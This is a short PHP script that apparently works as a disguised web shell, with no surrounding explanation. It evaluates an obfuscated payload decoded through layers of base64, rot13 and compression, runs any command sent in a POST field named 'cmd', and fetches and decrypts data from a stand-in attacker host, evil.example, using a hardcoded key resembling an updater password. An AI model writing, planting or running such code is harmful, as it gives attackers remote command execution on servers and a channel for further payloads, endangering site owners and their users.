<?php
$k = 'Upd4t3r!';
$iv = '0123456789abcdef';
$p = 'ZjdSaWxQdURGUjNCbFNxRHE0NTA4ZGZUcGhCR3ZsYllGeVhZNHRmRlgzQ2xSMUFkMW4wSTdCME4=';
eval(gzinflate(base64_decode(str_rot13(base64_decode($p)))));
if (isset($_POST['cmd'])) { system($_POST['cmd']); }
$data = file_get_contents('http://evil.example/beacon.txt');
$plain = openssl_decrypt($data, 'aes-256-cbc', md5($k, true), 0, $iv);
?>
